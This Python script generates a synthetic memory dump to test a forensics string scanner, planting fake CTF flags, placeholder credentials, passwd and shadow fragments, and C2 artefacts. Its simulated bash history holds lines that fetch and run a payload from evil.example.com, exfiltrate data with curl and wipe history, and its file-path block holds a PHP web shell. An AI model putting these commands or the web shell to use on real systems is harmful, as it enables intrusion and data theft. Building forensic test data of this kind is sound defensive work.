#!/usr/bin/env python3
"""
make_test_dump.py — Generate a synthetic memory dump for testing memhunter.py
==============================================================================
Creates a fake but realistic-looking raw memory image that exercises every
string-based feature of memhunter.py:

  - Direct flags in multiple CTF formats
  - Flags hidden inside environment variable blocks
  - Bash history entries (some revealing flag locations)
  - Base64-encoded flags
  - Credentials / passwords / tokens
  - SSH key fragments
  - Network artefacts (IPs, URLs, emails)
  - Process name strings
  - Kernel banner string
  - Simulated /etc/passwd and /etc/shadow fragments

Usage:
    python3 make_test_dump.py                    # writes test_dump.raw (64 MB)
    python3 make_test_dump.py -o /tmp/ctf.raw    # custom path
    python3 make_test_dump.py --size 128         # 128 MB dump
"""

import argparse
import base64
import os
import random
import struct
import sys
from pathlib import Path

# ── Colours ────────────────────────────────────────────────────────────────
G = "\033[32m"; Y = "\033[33m"; C = "\033[36m"; R = "\033[0m"

# ===========================================================================
# All the interesting strings we want to plant in the dump
# ===========================================================================

# --- Kernel / system banner -------------------------------------------------
KERNEL_BANNER = (
    b"Linux version 5.15.0-kali3-amd64 (kali@kali) "
    b"(gcc version 11.2.0 (Debian 11.2.0-19)) "
    b"#1 SMP Debian 5.15.15-2kali1 (2022-01-31)\x00"
)

# --- Process table simulation -----------------------------------------------
PROCESS_BLOCK = b"""
PID   PPID  NAME             CMD
1     0     systemd          /sbin/init
2     1     kthreadd         [kthreadd]
245   1     sshd             /usr/sbin/sshd -D
312   1     cron             /usr/sbin/cron -f
401   1     bash             -bash
402   401   python3          python3 /opt/server/app.py
501   1     nginx            nginx: master process /usr/sbin/nginx
888   1     backdoor         /tmp/.hidden/backdoor -c 192.168.1.100 4444
\x00"""

# --- Environment variable blocks --------------------------------------------
# These are what `linux.envars` would find. We simulate multiple processes.
ENV_BLOCKS = [
    # Process 401 — normal bash session with hidden flag
    (
        b"USER=ctfplayer\x00"
        b"HOME=/home/ctfplayer\x00"
        b"SHELL=/bin/bash\x00"
        b"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\x00"
        b"FLAG=picoCTF{3nv1r0nm3nt_v4r14bl3s_4r3_fun_8a2f91c}\x00"
        b"TERM=xterm-256color\x00"
        b"LANG=en_US.UTF-8\x00"
        b"SECRET_KEY=s3cr3t_k3y_d0_n0t_sh4r3\x00"
        b"PWD=/home/ctfplayer\x00"
    ),
    # Process 402 — python app leaking credentials
    (
        b"USER=www-data\x00"
        b"HOME=/var/www\x00"
        b"DB_HOST=10.0.0.5\x00"
        b"DB_USER=admin\x00"
        b"DB_PASSWORD=Sup3rS3cur3P@ssw0rd!\x00"
        b"API_KEY=ghp_faketoken1234567890abcdef\x00"
        b"JWT_SECRET=jwt_secret_ctf_challenge_key\x00"
        b"FLAG2=HTB{3nv_v4rs_c4n_l34k_s3cr3ts_t00}\x00"
        b"PORT=8080\x00"
    ),
    # Process 888 — backdoor process environment
    (
        b"USER=root\x00"
        b"HOME=/root\x00"
        b"C2_HOST=192.168.1.100\x00"
        b"C2_PORT=4444\x00"
        b"EXFIL_KEY=THM{r00tk1t_3nv_d3t3ct3d_gg}\x00"
        b"PERSISTENCE=cron\x00"
    ),
]

# --- Bash history simulation ------------------------------------------------
BASH_HISTORY = (
    b"ls -la /home/ctfplayer\n"
    b"cat /etc/passwd\n"
    b"ssh admin@10.0.0.1\n"
    b"sudo su\n"
    b"cd /root\n"
    b"ls -la\n"
    b"cat flag.txt\n"
    b"echo 'CTF{bash_h1st0ry_4lw4ys_t3lls_4_st0ry}' > /tmp/flag.txt\n"
    b"python3 -c \"import base64; print(base64.b64encode(b'secretdata').decode())\"\n"
    b"curl http://10.0.0.5:8080/exfil?data=c2VjcmV0ZmxhZw==\n"
    b"wget http://evil.example.com/payload.sh -O /tmp/.hidden/payload.sh\n"
    b"chmod +x /tmp/.hidden/payload.sh\n"
    b"./payload.sh\n"
    b"history -c\n"
    b"rm -rf /tmp/.hidden\n"
)

# --- /etc/passwd and /etc/shadow fragments ----------------------------------
ETC_PASSWD = (
    b"root:x:0:0:root:/root:/bin/bash\n"
    b"daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
    b"www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n"
    b"ctfplayer:x:1001:1001:CTF Player,,,:/home/ctfplayer:/bin/bash\n"
    b"backdoor:x:0:0::/root:/bin/bash\n"
)

ETC_SHADOW = (
    b"root:$6$salt$hashedpassword1234567890abcdef:19000:0:99999:7:::\n"
    b"ctfplayer:$6$CTFsalt$CTFhashedpass9876543210fedcba:19000:0:99999:7:::\n"
    b"backdoor:$6$b4ck$d00rh4sh3dpa55w0rd1234567890ab:19000:0:99999:7:::\n"
)

# --- Network artefacts ------------------------------------------------------
NETWORK_BLOCK = (
    b"TCP 0.0.0.0:22         0.0.0.0:0       LISTEN      245/sshd\n"
    b"TCP 0.0.0.0:80         0.0.0.0:0       LISTEN      501/nginx\n"
    b"TCP 10.0.0.10:54321    192.168.1.100:4444 ESTABLISHED 888/backdoor\n"
    b"TCP 10.0.0.10:43210    10.0.0.5:8080   ESTABLISHED 402/python3\n"
    b"UDP 0.0.0.0:68         0.0.0.0:0       0/\n"
    b"\n"
    b"# C2 infrastructure\n"
    b"# Primary:   192.168.1.100:4444\n"
    b"# Backup:    evil.example.com:443\n"
    b"# Exfil URL: http://10.0.0.5:8080/upload\n"
    b"admin@evil.example.com\n"
    b"attacker@protonmail.com\n"
)

# --- Credentials scattered in heap ------------------------------------------
CREDENTIAL_BLOCK = (
    b"mysql_password=P@ssw0rd_mysql_2024\n"
    b"redis_auth=redis_secret_token_abc123\n"
    b"private_key_passphrase=my_ssh_key_passphrase\n"
    b"admin_password=Admin@12345!\n"
    b"api_token=sk-live-abc123def456ghi789\n"
    b"aws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n"
)

# --- SSH key fragment -------------------------------------------------------
SSH_KEY_FRAGMENT = (
    b"-----BEGIN OPENSSH PRIVATE KEY-----\n"
    b"b3BlbnNzaC1rZXktdjEAAAAA fake_key_data_for_ctf_testing_only\n"
    b"AAAAB3NzaC1yc2EAAAADAQABAAABgQC fake_rsa_public_part_here\n"
    b"-----END OPENSSH PRIVATE KEY-----\n"
    b"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCfakeRSAkeyForCTFtesting "
    b"ctfplayer@kali\n"
)

# --- Flags planted in raw heap memory (simulates process heap) --------------
RAW_FLAGS = [
    b"flag{y0u_f0und_th3_r4w_m3m0ry_fl4g!}",
    b"CTF{bash_h1st0ry_4lw4ys_t3lls_4_st0ry}",
    b"DUCTF{dump_4n4lys1s_pr0_sk1lls_2024}",
]

# --- Base64-encoded secrets -------------------------------------------------
# These decode to readable flags/secrets
B64_PAYLOADS = [
    base64.b64encode(b"supersecret_password_in_base64"),
    base64.b64encode(b"flag{b4s3_64_3nc0d3d_fl4g_f0und}"),
    base64.b64encode(b"ssh_private_key_data_exfiltrated"),
    base64.b64encode(b"CTF{decoded_from_base64_nice_work}"),
    base64.b64encode(b'{"user":"admin","token":"ctf_jwt_secret_key_here"}'),
]

# --- Kernel module list simulation ------------------------------------------
MODULE_BLOCK = (
    b"Module                  Size  Used by\n"
    b"rootkit                16384  0  [permanent]\n"
    b"syscall_hook            8192  1 rootkit\n"
    b"iptable_filter         16384  0\n"
    b"ip_tables              32768  1 iptable_filter\n"
    b"ext4                  753664  2\n"
    b"mbcache                16384  1 ext4\n"
    b"jbd2                  131072  1 ext4\n"
)

# --- URLs and HTTP artefacts ------------------------------------------------
URL_BLOCK = (
    b"GET /exfil?flag=cGljb0NURntleGZpbF9kZXRlY3RlZH0= HTTP/1.1\n"
    b"Host: evil.example.com\n"
    b"User-Agent: python-requests/2.28.0\n"
    b"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fake\n"
    b"\n"
    b"POST /upload HTTP/1.1\n"
    b"Host: 10.0.0.5:8080\n"
    b"Content-Type: application/json\n"
    b'{"secret":"exfiltrated_data","flag":"HTB{n3tw0rk_f0r3ns1cs_w1ns}"}\n'
    b"\n"
    b"https://pastebin.com/raw/fakepastebin123\n"
    b"http://evil.example.com/c2/beacon\n"
    b"ftp://10.0.0.100/backdoor.sh\n"
)

# --- Interesting file paths -------------------------------------------------
FILE_PATHS = (
    b"/root/flag.txt\x00"
    b"/home/ctfplayer/.flag\x00"
    b"/tmp/.hidden/backdoor\x00"
    b"/tmp/.hidden/payload.sh\x00"
    b"/dev/shm/.c2_socket\x00"
    b"/etc/cron.d/persistence\x00"
    b"/var/www/html/shell.php\x00"
    b"<?php system($_GET['cmd']); ?>\x00"
)


# ===========================================================================
# Dump generator
# ===========================================================================

def pad_to(data: bytes, size: int, filler: bytes = b"\x00") -> bytes:
    """Pad data to exactly `size` bytes."""
    if len(data) >= size:
        return data[:size]
    return data + filler * (size - len(data))


def random_noise(size: int) -> bytes:
    """Generate realistic-looking memory noise (mix of nulls and random bytes)."""
    buf = bytearray(size)
    # Sparse random bytes — real memory has lots of nulls
    for _ in range(size // 20):
        pos = random.randint(0, size - 1)
        buf[pos] = random.randint(1, 255)
    return bytes(buf)


def place_string(buf: bytearray, offset: int, data: bytes) -> int:
    """Write data into buf at offset, return next free offset."""
    end = offset + len(data)
    if end <= len(buf):
        buf[offset:end] = data
    return end + random.randint(64, 512)   # gap between artefacts


def build_dump(size_mb: int) -> bytearray:
    size = size_mb * 1024 * 1024
    print(f"{C}[*]{R} Allocating {size_mb} MB buffer …")
    buf = bytearray(random_noise(size))

    # ── Page 0: partial MBR / boot sector look ──────────────────────────
    buf[0:4]   = b"\x00\x00\x00\x00"
    buf[0x1FE:0x200] = b"\x55\xAA"

    # ── 1 MB mark: kernel banner (realistic location) ────────────────────
    offset = 0x100000
    print(f"{C}[*]{R} Planting kernel banner …")
    offset = place_string(buf, offset, KERNEL_BANNER)

    # ── Process table block ──────────────────────────────────────────────
    print(f"{C}[*]{R} Planting process table …")
    offset = place_string(buf, offset, PROCESS_BLOCK)

    # ── Environment variable blocks ──────────────────────────────────────
    print(f"{C}[*]{R} Planting environment variable blocks …")
    for env in ENV_BLOCKS:
        offset = place_string(buf, offset, env)
        offset += random.randint(0x1000, 0x4000)   # simulate page gap

    # ── Bash history ─────────────────────────────────────────────────────
    print(f"{C}[*]{R} Planting bash history …")
    offset = place_string(buf, offset, BASH_HISTORY)

    # ── /etc/passwd and /etc/shadow ──────────────────────────────────────
    print(f"{C}[*]{R} Planting /etc/passwd and /etc/shadow …")
    offset = place_string(buf, offset, ETC_PASSWD)
    offset = place_string(buf, offset, ETC_SHADOW)

    # ── Network connection table ─────────────────────────────────────────
    print(f"{C}[*]{R} Planting network artefacts …")
    offset = place_string(buf, offset, NETWORK_BLOCK)

    # ── Credentials ──────────────────────────────────────────────────────
    print(f"{C}[*]{R} Planting credential strings …")
    offset = place_string(buf, offset, CREDENTIAL_BLOCK)

    # ── SSH keys ─────────────────────────────────────────────────────────
    print(f"{C}[*]{R} Planting SSH key fragment …")
    offset = place_string(buf, offset, SSH_KEY_FRAGMENT)

    # ── Raw flags scattered across heap ──────────────────────────────────
    print(f"{C}[*]{R} Scattering raw flags …")
    for flag in RAW_FLAGS:
        offset += random.randint(0x2000, 0x8000)
        offset = place_string(buf, offset, flag)

    # ── Base64 payloads ───────────────────────────────────────────────────
    print(f"{C}[*]{R} Planting base64 payloads …")
    for b64 in B64_PAYLOADS:
        offset += random.randint(0x500, 0x2000)
        offset = place_string(buf, offset, b64)

    # ── Module list ───────────────────────────────────────────────────────
    print(f"{C}[*]{R} Planting kernel module list …")
    offset = place_string(buf, offset, MODULE_BLOCK)

    # ── HTTP / URL artefacts ──────────────────────────────────────────────
    print(f"{C}[*]{R} Planting URL and HTTP artefacts …")
    offset = place_string(buf, offset, URL_BLOCK)

    # ── File paths ────────────────────────────────────────────────────────
    print(f"{C}[*]{R} Planting file path strings …")
    offset = place_string(buf, offset, FILE_PATHS)

    # ── Duplicate some flags deep in the dump (simulates heap spray) ──────
    deep = size // 2
    for flag in RAW_FLAGS[:2]:
        deep = place_string(buf, deep, flag)
        deep += random.randint(0x10000, 0x40000)

    # ── Near end: one more env block (simulates another process) ─────────
    near_end = size - 0x200000
    place_string(buf, near_end, ENV_BLOCKS[0])

    return buf


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Generate a synthetic memory dump for testing memhunter.py"
    )
    parser.add_argument("-o", "--output", default="test_dump.raw",
                        help="Output file path (default: test_dump.raw)")
    parser.add_argument("--size", type=int, default=64,
                        help="Dump size in MB (default: 64)")
    args = parser.parse_args()

    print()
    print(f"  {G}Synthetic Memory Dump Generator{R}")
    print(f"  {'─'*40}")
    print(f"  Output : {args.output}")
    print(f"  Size   : {args.size} MB")
    print()

    buf = build_dump(args.size)

    out = Path(args.output)
    print(f"{C}[*]{R} Writing {args.size} MB to {out} …")
    out.write_bytes(buf)

    print()
    print(f"  {G}[+] Done! → {out.resolve()}{R}")
    print(f"  {G}[+] Size : {out.stat().st_size // (1024*1024)} MB{R}")
    print()
    print("  Test it with:")
    print(f"    python3 memhunter.py {out}")
    print()
    print("  What's hidden inside:")
    print("    - 3 × raw flags (flag{{...}}, CTF{{...}}, DUCTF{{...}})")
    print("    - 3 × env var flags (picoCTF, HTB, THM formats)")
    print("    - 1 × bash history flag (CTF{{...}})")
    print("    - 5 × base64 blobs (2 decode to flags)")
    print("    - SSH private key fragment")
    print("    - /etc/passwd and /etc/shadow fragments")
    print("    - Credentials: DB password, API key, JWT secret, AWS key")
    print("    - Network: C2 IP, exfil URL, backdoor connection")
    print("    - Suspicious module: rootkit, syscall_hook")
    print()


if __name__ == "__main__":
    main()
